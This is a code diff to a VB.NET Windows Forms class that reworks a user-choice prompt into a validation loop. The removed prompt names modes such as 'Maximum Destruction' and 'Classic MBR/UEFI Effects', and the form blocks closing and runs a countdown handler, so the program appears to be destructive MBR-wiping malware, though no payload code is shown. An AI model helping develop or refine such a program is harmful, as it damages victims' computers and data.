@@ -713,30 +713,34 @@ Public Class Form2
         e.Cancel = True
     End Sub
 
-    ' Function to prompt user for a choice using a MessageBox
     Public Function PromptUserForChoice(message As String, options As String()) As String
-        Dim choice As String
+        Dim choice As String = ""
+        Dim validChoice As Boolean = False
 
-        ' Prompt the user for a choice with the first option as the default (only if they type something)
-        choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", "")
+        ' Loop until the user makes a valid choice or cancels
+        Do While Not validChoice
+            ' Prompt the user for a choice
+            choice = InputBox(message, "User Choice", "").Trim()
 
-        ' Check if the user pressed Cancel or left the input blank
-        If String.IsNullOrEmpty(choice) Then
-            MessageBox.Show("You must select a valid option!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-            Return String.Empty ' If the user cancels or input is blank, return empty
-        End If
-
-        ' Validate user choice against available options
-        For Each opt In options
-            If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
-                Return opt ' Return the valid choice if the input matches one of the options
+            ' Check if the user pressed Cancel or left the input blank
+            If String.IsNullOrEmpty(choice) Then
+                MessageBox.Show("You must select a valid option!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                Return String.Empty ' If the user cancels or input is blank, return empty
             End If
-        Next
 
-        ' If the choice is invalid, display an error message
-        MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+            ' Validate user choice against available options
+            For Each opt In options
+                If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
+                    validChoice = True
+                    Return opt ' Return the valid choice if the input matches one of the options
+                End If
+            Next
 
-        Return String.Empty ' Return an empty string if no valid choice was made
+            ' If the choice is invalid, display an error message
+            MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+        Loop
+
+        Return String.Empty ' This line will never be reached, but it's a safety net.
     End Function
 
     Private Sub OnCountdownComplete()
